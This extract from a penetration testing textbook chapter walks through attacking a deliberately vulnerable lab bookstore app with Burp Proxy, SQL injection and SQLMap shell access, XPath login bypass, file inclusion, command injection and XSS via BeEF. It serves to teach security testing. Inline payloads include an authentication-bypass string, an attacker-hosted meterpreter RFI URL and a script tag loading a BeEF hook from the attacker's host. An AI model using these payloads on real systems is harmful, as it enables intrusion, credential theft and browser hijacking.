- en: Chapter 14. Web Application Testing
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Though automated scanners are great at finding known vulnerabilities in web
    applications, many clients build custom web applications. Sure, commercial products
    can automate attacks against user input fields in custom web applications, but
    nothing can replace a good penetration tester with a proxy when it comes to finding
    security issues in these applications.
  prefs: []
  type: TYPE_NORMAL
- en: Like all software, web applications may have issues when input is not properly
    sanitized. For example, when an application pulls data from a database based on
    certain user input, the application may expect specific input such as a username
    and password. If, instead, the user enters special input to create additional
    database queries, he or she may be able to steal data from the database, bypass
    authentication, or even execute commands on the underlying system.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter we’ll look at finding some common vulnerabilities in web applications
    using the example web application installed on the Windows 7 target: a simple
    bookstore with several security issues frequently found in web applications. (See
    [Installing Additional Software](ch01.xhtml#installing_additional_software "Installing
    Additional Software") for installation instructions.)'
  prefs: []
  type: TYPE_NORMAL
- en: Using Burp Proxy
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We can use a proxy to capture requests and responses between our browser and
    the web application so we can see exactly what data is being transmitted. Kali
    Linux comes with the free version of Burp Suite, a testing platform for web applications
    that includes a proxy feature. Burp includes other useful components, such as
    Burp Spider, which can crawl through web application content and functionality,
    and Burp Repeater, which allows you to manipulate and resend requests to the server.
    For now, we’ll focus on the Burp Proxy tab.
  prefs: []
  type: TYPE_NORMAL
- en: To start Burp Suite in Kali Linux, go to Applications at the top left of the
    Kali GUI, and then click **Kali Linux** ▸ **Web Applications** ▸ **Web Application
    Fuzzers** ▸ **burpsuite**, as shown in [Figure 14-1](ch14.xhtml#starting_burp_suite_in_kali
    "Figure 14-1. Starting Burp Suite in Kali").
  prefs: []
  type: TYPE_NORMAL
- en: '![Starting Burp Suite in Kali](httpatomoreillycomsourcenostarchimages2030426.png.jpg)Figure 14-1. Starting
    Burp Suite in Kali'
  prefs: []
  type: TYPE_NORMAL
- en: Click the Proxy tab, as shown in [Figure 14-2](ch14.xhtml#burp_proxy_interface
    "Figure 14-2. Burp Proxy interface"). By default, the Intercept is on button should
    be selected so that Burp Suite intercepts and traps any outgoing requests from
    a web browser configured to use Burp as a proxy for web traffic. This setting
    will allow us to see and even modify the details of web requests before they are
    sent to the server.
  prefs: []
  type: TYPE_NORMAL
- en: '![Burp Proxy interface](httpatomoreillycomsourcenostarchimages2030428.png.jpg)Figure 14-2. Burp
    Proxy interface'
  prefs: []
  type: TYPE_NORMAL
- en: Now we need to tell our browser in Kali Linux to proxy web traffic through Burp
    Suite.
  prefs: []
  type: TYPE_NORMAL
- en: Open the Iceweasel browser, go to **Edit** ▸ **Preferences** ▸ **Advanced**,
    and select the **Network** tab.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Click **Settings** to the right of Connection.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In the Connection Settings dialog, shown in [Figure 14-3](ch14.xhtml#setting_a_proxy_in_iceweasel
    "Figure 14-3. Setting a proxy in Iceweasel"), select **Manual proxy configuration**,
    and enter the IP address **`127.0.0.1`** and port **`8080`**. This tells Iceweasel
    to proxy traffic through the localhost on port 8080, the default port for Burp
    Proxy.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Setting a proxy in Iceweasel](httpatomoreillycomsourcenostarchimages2030430.png.jpg)Figure 14-3. Setting
    a proxy in Iceweasel'
  prefs: []
  type: TYPE_NORMAL
- en: 'To ensure that Iceweasel will proxy all our traffic through Burp Suite, browse
    to the URL bookservice on your Windows 7 target: *[http://192.168.20.12/bookservice](http://192.168.20.12/bookservice)*.'
  prefs: []
  type: TYPE_NORMAL
- en: The connection should appear to hang in the browser, and the browser and Burp
    Suite should light up as the `HTTP GET` request for the main page of the bookservice
    site is captured by Burp Proxy, as shown in [Figure 14-4](ch14.xhtml#captured_http_get_request
    "Figure 14-4. Captured HTTP GET request").
  prefs: []
  type: TYPE_NORMAL
- en: '![Captured HTTP GET request](httpatomoreillycomsourcenostarchimages2030432.png.jpg)Figure 14-4. Captured
    `HTTP GET` request'
  prefs: []
  type: TYPE_NORMAL
- en: We can see the details of the `HTTP GET` request asking the server for the bookservice
    web page.
  prefs: []
  type: TYPE_NORMAL
- en: As we will see later, we can make changes to the request before sending it on
    to the server, but for now, let’s just go ahead and forward the request (and any
    subsequent ones) by clicking the **Forward** button. Returning to the browser,
    we see the server has sent us the main page of the bookservice site, as shown
    in [Figure 14-5](ch14.xhtml#bookservice_site "Figure 14-5. Bookservice site").
  prefs: []
  type: TYPE_NORMAL
- en: '![Bookservice site](httpatomoreillycomsourcenostarchimages2030434.png.jpg)Figure 14-5. Bookservice
    site'
  prefs: []
  type: TYPE_NORMAL
- en: Next let’s try signing up for an account ([Figure 14-6](ch14.xhtml#signing_up_for_a_new_account
    "Figure 14-6. Signing up for a new account")). Click **Login** at the top left
    of the page, and then forward the request to the server from the proxy. Do the
    same to get to the Sign Up page by clicking **New User** and forwarding the request
    to the server.
  prefs: []
  type: TYPE_NORMAL
- en: '![Signing up for a new account](httpatomoreillycomsourcenostarchimages2030436.png.jpg)Figure 14-6. Signing
    up for a new account'
  prefs: []
  type: TYPE_NORMAL
- en: Enter a username, password, and email address, then submit the request by clicking
    **Go**. The request should be captured in Burp Proxy, as shown in [Figure 14-7](ch14.xhtml#captured_request
    "Figure 14-7. Captured request").
  prefs: []
  type: TYPE_NORMAL
- en: '![Captured request](httpatomoreillycomsourcenostarchimages2030438.png.jpg)Figure 14-7. Captured
    request'
  prefs: []
  type: TYPE_NORMAL
- en: In addition to looking at the raw request, which is a bit unfriendly to read,
    you can click the Params tab at the top of the request window in Burp Suite to
    display the request parameters in a more readable format, as shown in [Figure 14-8](ch14.xhtml#request_parameters
    "Figure 14-8. Request parameters").
  prefs: []
  type: TYPE_NORMAL
- en: '![Request parameters](httpatomoreillycomsourcenostarchimages2030440.png.jpg)Figure 14-8. Request
    parameters'
  prefs: []
  type: TYPE_NORMAL
- en: For example, the new display shows the User field *georgia*, Pass field *password*,
    and Email field *georgia@bulbsecurity.com*.
  prefs: []
  type: TYPE_NORMAL
- en: You can change these fields directly in the proxy. For example, if you change
    *georgia*’s password to *password1* before forwarding the request to the server,
    the server will set the password for user *georgia* to *password1*, because the
    server never saw the original request from the browser requesting the password
    *password*.
  prefs: []
  type: TYPE_NORMAL
- en: The proxy allows you to see the details of any request to the server. If at
    any point you don’t need to proxy traffic, click **Intercept is on** to toggle
    it to **Intercept is off** and allow traffic to pass through to the server without
    user interaction. Switch the button back on if you want to catch a particular
    request.
  prefs: []
  type: TYPE_NORMAL
- en: SQL Injection
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Many web applications store data in a backend, SQL-based database. For example,
    we encountered a SQL database during our network penetration test, when we found
    an open MySQL database through phpMyAdmin in the XAMPP install on the Windows
    XP target in [Exploiting Open phpMyAdmin](ch08.xhtml#exploiting_open_phpmyadmin
    "Exploiting Open phpMyAdmin"). We then used a SQL query to write a simple PHP
    command shell to the web server.
  prefs: []
  type: TYPE_NORMAL
- en: We typically won’t have direct access to run SQL queries on a site’s backend
    database from a web application. However, if a developer fails to sanitize user
    input when interacting with the database, you may find that you can perform a
    *SQL injection attack* to manipulate the queries sent to it. Successful SQL injection
    attacks can read data from the database, modify data, shut down or destroy the
    database, and, in some cases, even run commands on the underlying operating system
    (which can be especially powerful because database servers often run as privileged
    users).
  prefs: []
  type: TYPE_NORMAL
- en: 'A natural place to look for SQL injection issues is in the login page. Many
    web applications store user data in a database, so we can use a SQL query to pull
    out the correct user, based on the username and password provided by the user.
    When developers don’t sanitize user input, we can build SQL queries to attack
    the database. An example of an injectable SQL statement that could be leveraged
    by an attacker is shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'What if an attacker supplied a username *’ OR ’1’=’1* and the user’s password
    was *’ OR ’1’=’1*? The SQL statement turns into:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: Because the *OR ’1’=’1’* will always be true, this `SELECT` statement will now
    return the first username in the user table, regardless of the username and password.
  prefs: []
  type: TYPE_NORMAL
- en: 'As we’ll see in [XPath Injection](ch14.xhtml#xpath_injection "XPath Injection"),
    our application uses Xpath, a query language for XML documents, which authenticates
    against an XML file rather than a database, though the injection process is similar.
    However, our application does use a SQL database to store records of the books
    available in the store, and when we select a book on the main page, its details
    are pulled from an MS SQL backend database. For example, click the **More Details**
    link for the first book on the site, *Don’t Make Me Think*. The URL requested
    is:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: The book’s details are filled in based on the results returned from the database
    query for the record with ID `1`.
  prefs: []
  type: TYPE_NORMAL
- en: Testing for SQL Injection Vulnerabilities
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: A typical first test for SQL injection vulnerabilities is to use a single quotation
    mark to close the SQL query. If a SQL injection vulnerability is present, the
    addition of that quotation mark should cause the application to throw a SQL error,
    because the query will already be closed as part of the underlying code and the
    extra single quote will cause the SQL syntax to be incorrect. That error will
    tell us that we can inject SQL queries to the site’s database using the `id` parameter.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s try this out by sending the query again with the `id` parameter to *1’*,
    as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: As expected, the application serves an error page indicating that our SQL syntax
    is incorrect, as shown in [Figure 14-9](ch14.xhtml#application_identifies_a_sql_errordot
    "Figure 14-9. The application identifies a SQL error.").
  prefs: []
  type: TYPE_NORMAL
- en: '![The application identifies a SQL error.](httpatomoreillycomsourcenostarchimages2030442.png.jpg)Figure 14-9. The
    application identifies a SQL error.'
  prefs: []
  type: TYPE_NORMAL
- en: In particular, note the message “Unclosed quotation mark after the character
    string” in our SQL query.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Not all applications that are vulnerable to SQL injection will be so verbose
    with their error messages. In fact, there is a whole class of blind SQL injection
    vulnerabilities, where error messages detailing the injection are not shown, even
    though the injection flaw is still present.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting SQL Injection Vulnerabilities
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Now that we know a SQL injection vulnerability is present in this site, we
    can exploit it to run additional queries on the database that the developer never
    intended. For example, we can find out the name of the first database with the
    following query:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: The query throws an error message, *Conversion failed when converting the nvarchar
    value ‘BookApp’ to data type int*, which tells us that the name of the first database
    is BookApp, as shown in [Figure 14-10](ch14.xhtml#error_message_showing_the_database_name
    "Figure 14-10. Error message showing the database name").
  prefs: []
  type: TYPE_NORMAL
- en: '![Error message showing the database name](httpatomoreillycomsourcenostarchimages2030444.png.jpg)Figure 14-10. Error
    message showing the database name'
  prefs: []
  type: TYPE_NORMAL
- en: Using SQLMap
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: We can also use tools to automatically generate SQL queries to perform various
    tasks on a site using SQL injection. All we need is an injection point; the tool
    does the rest. For example, [Example 14-1](ch14.xhtml#dumping_the_database_with_sqlmap
    "Example 14-1. Dumping the database with SQLMap") shows how when we give a tool
    in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL injection vulnerabilities
    and performs injection queries.
  prefs: []
  type: TYPE_NORMAL
- en: Example 14-1. Dumping the database with SQLMap
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: Specify the URL to test with `-u` option ❶. The `--dump` option ❷ dumps the
    contents of the database—in this case, details of the books.
  prefs: []
  type: TYPE_NORMAL
- en: We can also use SQLMap to try to get command-shell access on the underlying
    system. MS SQL databases contain a stored procedure called `xp_cmdshell`, which
    will give us command-shell access, but it’s often disabled. Luckily, SQLMap will
    try to reenable it. [Example 14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql
    "Example 14-2. xp_cmdshell access through SQL injection") shows how we can get
    a command shell on the site’s underlying Windows 7 target system using SQLMap.
  prefs: []
  type: TYPE_NORMAL
- en: Example 14-2. `xp_cmdshell` access through SQL injection
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: As you can see in [Example 14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql
    "Example 14-2. xp_cmdshell access through SQL injection"), we receive a shell
    running as *System* without having to guess credentials for the database.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The MS SQL database is not listening on a port anyway, so we can’t access it
    directly. Unlike our Windows XP system in [Chapter 6](ch06.xhtml "Chapter 6. Finding
    Vulnerabilities"), this web server lacks phpMyAdmin, so we have no other way to
    access the database. A SQL injection issue in the hosted website gives us full
    system access.
  prefs: []
  type: TYPE_NORMAL
- en: XPath Injection
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: As mentioned previously, this bookservice application uses XML authentication,
    in which the XML is queried using Xpath. We can use *XPath injection* to attack
    XML. Though its syntax differs from SQL, the injection process is similar.
  prefs: []
  type: TYPE_NORMAL
- en: For example, try entering single quotes (**`'`**) for both the username and
    password fields at the login page. You should receive an error like the one shown
    in [Figure 14-11](ch14.xhtml#xml_error_at_login "Figure 14-11. XML error at login").
  prefs: []
  type: TYPE_NORMAL
- en: '![XML error at login](httpatomoreillycomsourcenostarchimages2030446.png.jpg)Figure 14-11. XML
    error at login'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see from the error message shown in [Figure 14-11](ch14.xhtml#xml_error_at_login
    "Figure 14-11. XML error at login"), we again have an injection issue because
    we have an error in our syntax. Because we are at a login page, a typical injection
    strategy for Xpath would be to attempt to bypass authentication and gain access
    to the authenticated portion of the application by attacking the Xpath query logic.
  prefs: []
  type: TYPE_NORMAL
- en: For example, as shown in the error details, the login query grabs the username
    and password provided, and then compares the values provided against credentials
    in an XML file. Can we create a query to bypass the need for valid credentials?
    Enter a set of dummy credentials at login, and capture the request with Burp Proxy,
    as shown in [Figure 14-12](ch14.xhtml#captured_login_request "Figure 14-12. Captured
    login request").
  prefs: []
  type: TYPE_NORMAL
- en: Now change the `txtUser` and `txtPass` parameters in the captured request to
    this value.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: '![Captured login request](httpatomoreillycomsourcenostarchimages2030448.png.jpg)Figure 14-12. Captured
    login request'
  prefs: []
  type: TYPE_NORMAL
- en: This tells the login Xpath query to find the user account where the username
    and password field is blank or *1=1*. Because *1=1* always evaluates as true,
    the logic of this query says to return the user where the username is blank or
    present—likewise with the password. Thus using this injection method, we can get
    the application to log us in as the first user in the authentication file. And,
    as shown in [Figure 14-13](ch14.xhtml#authentication_bypass_through_xpath_inje
    "Figure 14-13. Authentication bypass through Xpath injection"), we are logged
    in as the user *Mike*.
  prefs: []
  type: TYPE_NORMAL
- en: '![Authentication bypass through Xpath injection](httpatomoreillycomsourcenostarchimages2030450.png.jpg)Figure 14-13. Authentication
    bypass through Xpath injection'
  prefs: []
  type: TYPE_NORMAL
- en: Local File Inclusion
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Another vulnerability commonly found in web applications is *local file inclusion*,
    which is the ability to read files from the application or the rest of the filesystem
    that we should not have access to through the web app. We saw an example of this
    in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation") where the Zervit web server
    on the Windows XP target allowed us to download files from the target, such as
    a backup of the SAM and SYSTEM hives.
  prefs: []
  type: TYPE_NORMAL
- en: Our bookservice app also suffers from local file inclusion. As user *Mike*,
    go to **Profile** ▸ **View Newsletters**. Click the first newsletter in the list
    to view the contents of the file, as shown in [Figure 14-14](ch14.xhtml#viewing_a_newsletter
    "Figure 14-14. Viewing a newsletter").
  prefs: []
  type: TYPE_NORMAL
- en: '![Viewing a newsletter](httpatomoreillycomsourcenostarchimages2030452.png.jpg)Figure 14-14. Viewing
    a newsletter'
  prefs: []
  type: TYPE_NORMAL
- en: Now resend the request, and capture it with Burp Proxy, as shown in [Figure 14-15](ch14.xhtml#captured_newsletter_request
    "Figure 14-15. Captured newsletter request").
  prefs: []
  type: TYPE_NORMAL
- en: '![Captured newsletter request](httpatomoreillycomsourcenostarchimages2030454.png.jpg)Figure 14-15. Captured
    newsletter request'
  prefs: []
  type: TYPE_NORMAL
- en: Click the **Params** tab, and note the parameter *c:\inetpub\wwwroot\Book\NewsLetter\Mike@Mike.com\Web
    Hacking Review.txt*. The path *c:\inetpub\wwwroot\Book\NewsLetter\Mike* suggests
    that the newsletter functionality is pulling the newsletters from the local filesystem
    by their absolute path. It also looks like there’s a folder called *Mike@Mike.com*
    in the *Newsletter* folder. Perhaps each user subscribed to the newsletters has
    such as folder.
  prefs: []
  type: TYPE_NORMAL
- en: It also seems as if our application is actually at the path *c:\inetpub\wwwroot\Book*,
    as noted in the newsletter requests, instead of *c:\inetpub\wwwroot\bookservice*
    as we might expect from the URL. We note this because it may come in handy later
    on.
  prefs: []
  type: TYPE_NORMAL
- en: What if we change the filename parameter to another file in the web application?
    Can we gain access to the app’s full source code? For example, change the file
    to the following, and forward the request to the server.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, the source code of the *Search.aspx* page is displayed in the
    Newsletter box, as shown in [Figure 14-16](ch14.xhtml#local_file_inclusion_vulnerability
    "Figure 14-16. Local file inclusion vulnerability").
  prefs: []
  type: TYPE_NORMAL
- en: Having access to the full server-side source code of the web application allows
    us to do a complete source code review to look for issues.
  prefs: []
  type: TYPE_NORMAL
- en: But perhaps we can access even more sensitive data. For example, we know that
    the usernames and passwords are stored in an XML file. Perhaps we can request
    this file. We don’t know its name, but a few guesses for common filenames in XML
    authentication scenarios will lead us to the filename *AuthInfo.xml*. Capture
    the newsletter request in Burp Proxy, and change the requested file to the one
    shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '![Local file inclusion vulnerability](httpatomoreillycomsourcenostarchimages2030456.png)Figure 14-16. Local
    file inclusion vulnerability'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'As you can see in [Figure 14-17](ch14.xhtml#authentication_info "Figure 14-17. Authentication
    info"), we now have access to the usernames and passwords in plaintext. Now we
    know why our previous Xpath injection logged us in as the user *Mike*: *Mike*
    is the first user in the file.'
  prefs: []
  type: TYPE_NORMAL
- en: This is a prime example of when using a proxy comes in handy. A user with just
    a browser would have been limited to only the files he or she could click on,
    namely the newsletters presented. On the other hand, with the proxy we are able
    to see the request ask for a specific file from the filesystem. By changing the
    filename manually in the request using Burp Proxy, we were able to see other sensitive
    files. No doubt the developer did not consider the possibility that the user could
    just ask for any file and, thus, did not think to limit the files that could be
    accessed through the user’s newsletters.
  prefs: []
  type: TYPE_NORMAL
- en: '![Authentication info](httpatomoreillycomsourcenostarchimages2030458.png)Figure 14-17. Authentication
    info'
  prefs: []
  type: TYPE_NORMAL
- en: 'Worse still, we aren’t limited to files from the web application. We can load
    any file from the filesystem that the IIS_USER has read access to. For example,
    if you create a file called *secret.txt* on the C: drive, you can load it through
    the newsletters functionality. Just substitute the file you want in the request
    in Burp Suite. If we can find a way to upload files to a web application, we can
    even use LFI vulnerability to execute malicious code on the webserver.'
  prefs: []
  type: TYPE_NORMAL
- en: Remote File Inclusion
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Remote file inclusion (RFI) vulnerabilities allow attackers to load and execute
    malicious scripts, hosted elsewhere, on a vulnerable server. In [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation"), we used the open phpMyAdmin interface in XAMPP to
    write a simple PHP shell and finally a PHP version of Meterpreter to the web server.
    Though we are not uploading a file to the server here, the attack is similar.
    If we can trick the vulnerable server into executing a remote script, we can run
    commands on the underlying system.
  prefs: []
  type: TYPE_NORMAL
- en: Our site does not have a remote file inclusion vulnerability, but simple vulnerable
    PHP code is shown here as an illustration.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: An attacker can host a malicious PHP script (such as the *meterpreter.php* script
    we used in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation")) on their webserver
    and request the page with the file parameter set to *http://<attacker_ip>/meterpreter.php*.
    The RFI vulnerability would cause *meterpreter.php* to be executed by the webserver
    even though it is hosted elsewhere. Of course, our example application is ASP.net
    not PHP, but Msfvenom can create payloads in ASPX format for these sorts of apps.
  prefs: []
  type: TYPE_NORMAL
- en: Command Execution
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: As noted earlier, the *Newsletters* folder contains a folder called *Mike@Mike.com*.
    Logically, this suggests that the site may contain similar folders with the email
    addresses of all users signed up to receive newsletters. Some part of the application
    must be creating these folders as users register or sign up for the newsletter.
    The application’s code is probably running a command to create the folders on
    the filesystem. Perhaps, again through lack of input validation, we can run additional
    commands that the developer never intended us to run.
  prefs: []
  type: TYPE_NORMAL
- en: As shown in [Figure 14-18](ch14.xhtml#newsletter_signup "Figure 14-18. Newsletter
    Signup"), the bottom right of the web app contains a form to sign up for newsletters.
    We suspect that when we enter an email address, a folder is created for that email
    address in the *newsletters* folder.
  prefs: []
  type: TYPE_NORMAL
- en: We guess that the email address input is fed to a system command to create a
    directory in the *newsletters* folder. If the developer does not properly sanitize
    user input, we may be able to run additional commands using the ampersand (`&`)
    symbol.
  prefs: []
  type: TYPE_NORMAL
- en: '![Newsletter Signup](httpatomoreillycomsourcenostarchimages2030460.png.jpg)Figure 14-18. Newsletter
    Signup'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll execute a command and send its output to a file in our application’s *C:\inetpub\wwwroot\Book\*
    directory, then access the files directly to see the command’s output. Run the
    `ipconfig` command on the Windows 7 target as shown here to pipe the output from
    a system command such as `ipconfig` to the file *test.txt* in the *Book* directory.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: When we browse to *[http://192.168.20.12/bookservice/test.txt](http://192.168.20.12/bookservice/test.txt)*,
    we see the output of our `ipconfig` command, as shown in [Figure 14-19](ch14.xhtml#command_execution_output
    "Figure 14-19. Command execution output").
  prefs: []
  type: TYPE_NORMAL
- en: '![Command execution output](httpatomoreillycomsourcenostarchimages2030462.png.jpg)Figure 14-19. Command
    execution output'
  prefs: []
  type: TYPE_NORMAL
- en: 'We will be limited to the privileges of the Internet Information Services (IIS)
    user. Unfortunately for us, the Microsoft IIS application on Windows 7 systems
    runs as a separate account without the full privileges of a system user: a better
    security scenario for the developer but a more challenging one for us.'
  prefs: []
  type: TYPE_NORMAL
- en: Though we don’t have full access, we will be able to gather a lot of information
    about the system with the access we do have. For example, we can use the `dir`
    command to find interesting files, or the command `netsh advfirewall firewall
    show rule name=all` to see the rules in the Windows firewall.
  prefs: []
  type: TYPE_NORMAL
- en: Since we are on a Windows system we cannot use `wget` from the command line
    to pull down an interactive shell, but we can use various other methods to do
    so. In [Chapter 8](ch08.xhtml "Chapter 8. Exploitation") we used TFTP to transfer
    a shell from our Kali system to the Windows XP target. Windows 7 does not have
    a TFTP client installed by default, but in Windows 7 we do have a powerful scripting
    language called *Powershell*, which we can use for tasks such as downloading and
    executing a file.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'A study of Powershell is outside of the scope of this book, but it is very
    helpful for post exploitation on the latest Windows operating systems. A good
    reference can be found here: *[http://www.darkoperator.com/powershellbasics/](http://www.darkoperator.com/powershellbasics/)*.'
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Scripting
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Perhaps the most common and most debated web application security vulnerability
    is cross-site scripting (XSS). When such vulnerabilities are present, attackers
    can inject malicious scripts into an otherwise innocuous site to be executed in
    the user’s browser.
  prefs: []
  type: TYPE_NORMAL
- en: 'XSS attacks are typically broken into two categories: stored and reflected.
    *Stored XSS attacks* are stored on the server and executed whenever a user visits
    the page where the script is stored. User forums, reviews, and other places where
    users can save input displayed to other users are ideal places for these sorts
    of attacks. *Reflective XSS attacks* are not stored on the server but are created
    by sending requests with the XSS attack itself. The attacks occur when user input
    is included in the server’s response, for example, in error messages or search
    results.'
  prefs: []
  type: TYPE_NORMAL
- en: Reflected XSS attacks rely on a user sending a request with the XSS attack included,
    so there will likely be some sort of social-engineering component to the attack
    as well. In fact, having XSS might actually increase the success of a social-engineering
    attack, because you can craft a URL that is part of a real website—a website the
    user knows and trusts—and use the XSS to, for instance, redirect the user to a
    malicious page. Like the other attacks discussed in this chapter, XSS attacks
    rely on a lack of user input sanitation, which allows us to create and run a malicious
    script.
  prefs: []
  type: TYPE_NORMAL
- en: Checking for a Reflected XSS Vulnerability
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: We should check any user input for XSS vulnerabilities. We’ll find that our
    application has a reflected XSS vulnerability in the search functionality. Try
    searching for the title *xss* in the Books Search box, as shown in [Figure 14-20](ch14.xhtml#search_function
    "Figure 14-20. Search function").
  prefs: []
  type: TYPE_NORMAL
- en: As shown in [Figure 14-21](ch14.xhtml#search_results_page "Figure 14-21. Search
    results page"), the search results page prints the original user input as part
    of the results. If the user input is not properly sanitized, this may be where
    we can use XSS.
  prefs: []
  type: TYPE_NORMAL
- en: '![Search function](httpatomoreillycomsourcenostarchimages2030464.png.jpg)Figure 14-20. Search
    function![Search results page](httpatomoreillycomsourcenostarchimages2030466.png)Figure 14-21. Search
    results page'
  prefs: []
  type: TYPE_NORMAL
- en: The typical first XSS test to try to run is a JavaScript alert box. The following
    code will attempt to put up a JavaScript alert with the text *xss*. If user input
    is not properly filtered, the script will be executed as part of the search results
    page.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: In some cases, the user’s browser will automatically block obvious XSS attacks
    such as this one, and Iceweasel is one such browser. Switch over to your Windows
    7 target with Internet Explorer. As shown in [Figure 14-22](ch14.xhtml#xss_pop-up
    "Figure 14-22. XSS pop-up"), the pop-up alert script executes.
  prefs: []
  type: TYPE_NORMAL
- en: '![XSS pop-up](httpatomoreillycomsourcenostarchimages2030468.png.jpg)Figure 14-22. XSS
    pop-up'
  prefs: []
  type: TYPE_NORMAL
- en: Having determined that reflective XSS is present, we could try to leverage it
    to attack users. Common attacks include stealing session cookies to send to an
    attacker-controlled site or embedding a frame (a way of splitting an HTML page
    into different segments) to prompt the user for login credentials. A user may
    think that the frame is part of the original page and enter his or her credentials,
    which are then sent offsite to the attacker.
  prefs: []
  type: TYPE_NORMAL
- en: Leveraging XSS with the Browser Exploitation Framework
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: XSS issues tend to be overlooked. How much damage can an alert box that says
    “XSS” do anyway? A good tool for leveraging XSS issues and uncovering their true
    attack potential is the Browser Exploitation Framework (BeEF). Using BeEF, we
    can “hook” a browser by tricking the user into browsing to our BeEF server, or
    better yet using the BeEF JavaScript hook as a payload in the presence of an XSS
    vulnerability like the one discussed previously.
  prefs: []
  type: TYPE_NORMAL
- en: Now change directories to */usr/share/beef-xss*, and run **`./beef`**, as shown
    in [Example 14-3](ch14.xhtml#starting_beef "Example 14-3. Starting BeEF"). This
    will start the BeEF server, including the web interface and the attack hook.
  prefs: []
  type: TYPE_NORMAL
- en: Example 14-3. Starting BeEF
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: Now in Kali, browse to *[http://192.168.20.9:3000/ui/panel](http://192.168.20.9:3000/ui/panel)*
    to access the BeEF web interface. You should be presented with a login page, like
    the one shown in [Figure 14-23](ch14.xhtml#beef_login_page "Figure 14-23. BeEF
    login page").
  prefs: []
  type: TYPE_NORMAL
- en: '![BeEF login page](httpatomoreillycomsourcenostarchimages2030470.png.jpg)Figure 14-23. BeEF
    login page'
  prefs: []
  type: TYPE_NORMAL
- en: The default credentials for BeEF are *beef:beef*. After you enter them in the
    login dialog, you are shown the web interface ([Figure 14-24](ch14.xhtml#beef_web_interface
    "Figure 14-24. BeEF web interface")).
  prefs: []
  type: TYPE_NORMAL
- en: '![BeEF web interface](httpatomoreillycomsourcenostarchimages2030472.png.jpg)Figure 14-24. BeEF
    web interface'
  prefs: []
  type: TYPE_NORMAL
- en: Currently no browsers are hooked in BeEF, so we need to trick someone into loading
    and running BeEF’s malicious *hook.js* script. Let’s return to our XSS vulnerability
    in the Book Search box. This time, instead of using an alert dialog, let’s leverage
    the issue to load BeEF’s *hook.js* in the target browser. From the Windows 7 Internet
    Explorer browser, enter **`"<script src=http://192.168.20.9:3000/hook.js></script>"`**
    into the Book Search box, and click **Go**. This time there will be no alert box
    or other indication to the user suggesting that anything is amiss, but if you
    turn back to BeEF, you should see the IP address of the Windows 7 box in the Online
    Browsers list at the left of the screen, as shown in [Figure 14-25](ch14.xhtml#hooked_browser
    "Figure 14-25. A hooked browser").
  prefs: []
  type: TYPE_NORMAL
- en: In the details pane, with the IP address of Windows 7 selected in BeEF, you
    can see details about the hooked browser as well as the underlying system, such
    as versions and installed software. At the top of the pane are additional tabs,
    such as Logs and Commands. Click **Commands** to see additional BeEF modules you
    can run against the hooked browser.
  prefs: []
  type: TYPE_NORMAL
- en: '![A hooked browser](httpatomoreillycomsourcenostarchimages2030474.png.jpg)Figure 14-25. A
    hooked browser'
  prefs: []
  type: TYPE_NORMAL
- en: For example, as shown in [Figure 14-26](ch14.xhtml#running_a_beef_module "Figure 14-26. Running
